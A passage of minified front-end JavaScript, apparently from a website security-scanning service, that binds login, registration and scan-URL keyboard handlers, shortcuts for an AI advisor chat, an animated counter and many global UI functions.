r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>')}window.updateThemeIcon=s;let o=ke("login-password");o&&o.addEventListener("keydown",function(d){d.key==="Enter"&&Fi()});let a=ke("reg-email"),n=ke("reg-password"),c=ke("reg-password2");a&&a.addEventListener("keydown",function(d){d.key==="Enter"&&It()}),n&&n.addEventListener("keydown",function(d){d.key==="Enter"&&It()}),c&&c.addEventListener("keydown",function(d){d.key==="Enter"&&It()});let g=ke("scan-url");g&&g.addEventListener("keydown",function(d){if(d.key!=="Enter")return;let f=document.getElementById("auth-check-step1");f&&f.checked&&Be()?typeof window.startScanDirect=="function"&&window.startScanDirect():typeof window.goVerifyStep2=="function"&&window.goVerifyStep2()}),document.addEventListener("keydown",function(d){if(d.key==="Escape"){let f=document.getElementById("ai-chat");if(f&&f.classList.contains("show")){f.classList.remove("show"),f.style.display="";return}document.querySelectorAll('.modal.show, [id$="-modal"][style*="display: block"]').forEach(function(m){m.style.display="none",m.classList.remove("show")})}if((d.ctrlKey||d.metaKey)&&d.key==="k"){d.preventDefault();let f=document.getElementById("scanUrl")||document.getElementById("scan-url");f&&(f.focus(),f.select())}if((d.ctrlKey||d.metaKey)&&d.key==="/"){d.preventDefault();let f=document.querySelector('[onclick*="aiChat" i], [onclick*="openAiAdvisor" i], [onclick*="showAiChat" i], #ai-advisor-btn, .ai-advisor-fab');f||(f=document.querySelector('button[aria-label*="安全顾问" i], button[aria-label*="AI" i]')),f?f.click():typeof toggleAiChat=="function"?toggleAiChat():typeof openAiAdvisor=="function"&&openAiAdvisor()}});function v(){document.querySelectorAll(".counter[data-count]").forEach(function(f){let h=parseInt(f.getAttribute("data-count"),10),m=f.getAttribute("data-suffix")||"",u=1200,y=0,b=null;function k(x){b||(b=x);let I=Math.min((x-b)/u,1),z=1-Math.pow(1-I,3),M=Math.floor(y+(h-y)*z);f.textContent=M+m,I<1&&requestAnimationFrame(k)}requestAnimationFrame(k)})}document.querySelector(".counter[data-count]")&&setTimeout(v,300),window.navigateTo=bt,window.toggleAIChat=Oo,window.sendAIMessage=zn,window.askAIQuick=jo,window.analyzeFixer=Do,window.loadSampleConfig=Ho,window.clearFixer=No,window.doLogin=Fi,window.doRegister=It,window.doLogout=kn,window.copyApiToken=xo,window.doResetPassword=wo,window.toggleAuthForm=wn,window.showProfileTab=Go,window.markAllAlertsRead=ta,window.toggleSetting=Jo,window.saveNotificationSettings=na,window.toggleApiKeyVisibility=ra,window.saveAIConfig=Ko,window.clearAIConfig=Yo,window.loadCreditsUsage=pi,window.updateUserCredits=Pe,window.scanAsset=Lo,window.extractError=tt,window.friendlyError=In,window.showToast=ie,window.isLoggedIn=Be,window.toggleAISetting=Qo,window.editAsset=Ao,window.deleteAsset=Bo,window.createMonitor=zo,window.aiSend=En,window.aiAsk=Sn,window.createTeam=Co,window.markAlertRead=ea,window.loadEvolution=Zt;try{fo()}catch(d){console.warn("initBillingPage error:",d)}document.body.addEventListener("click",function(d){d.target.closest('[data-action="add-asset"]')&&(d.preventDefault(),Ys())})});typeof window<"u"&&(window.downloadNginxConf=Wo,window.downloadRepairReport=Zo);typeof window<"u"&&(window.copyText=Vo,window.submitFindingFeedback=So);
